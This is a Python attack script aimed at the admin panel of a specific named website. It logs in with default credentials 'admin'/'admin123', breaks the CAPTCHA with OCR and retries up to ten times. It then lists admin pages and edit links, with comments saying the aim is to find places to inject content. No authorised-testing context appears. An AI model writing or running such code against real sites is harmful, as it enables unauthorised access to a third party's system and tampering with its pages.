#!/usr/bin/env python3
"""gz: check config-editing surfaces - cache/about (关于我们) + other writable config"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

for attempt in range(10):
    try:
        code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
        code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                 headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
        cap_text = ocr(cap)
        data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
        code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                  headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("utf-8", "ignore")
        if "登录成功" in rt or '"status":1' in rt:
            print("login ok")
            break
    except Exception:
        pass

# cache/about = 关于我们 (may be editable config)
for u, tag in [("/index.php?m=admin&c=cache&a=about", "about"),
               ("/index.php?m=admin&c=other&a=staticweb", "staticweb"),
               ("/index.php?m=admin&c=factory&a=addfactory", "addfactory"),
               ("/index.php?m=admin&c=category&a=addcategory", "addcategory")]:
    code, final, body = fetch(HOST + u, headers={"Referer": HOST + "/index.php?m=admin&c=index&a=index"})
    bt = body.decode("utf-8", "ignore")
    print("%s [%s]: %s size=%d" % (tag, u, code, len(bt)))
    # look for textarea/content editable fields
    forms = re.findall(r'<form[^>]*>|<textarea[^>]*>|<input[^>]*name=["\']([^"\']+)["\']', bt)
    if forms:
        print("  form elements:", forms[:10])
    # content field?
    if "content" in bt.lower() or "关于" in bt:
        print("  HAS CONTENT FIELD")

# check factory edit page for content injection
code, final, body = fetch(HOST + "/index.php?m=admin&c=factory&a=index", headers={"Referer": HOST + "/index.php?m=admin&c=index&a=index"})
bt = body.decode("utf-8", "ignore")
print("factory index:", code, len(bt))
m = re.findall(r'href=["\']([^"\']*(edit|update)[^"\']*)["\']', bt)
print("edit links:", m[:5])
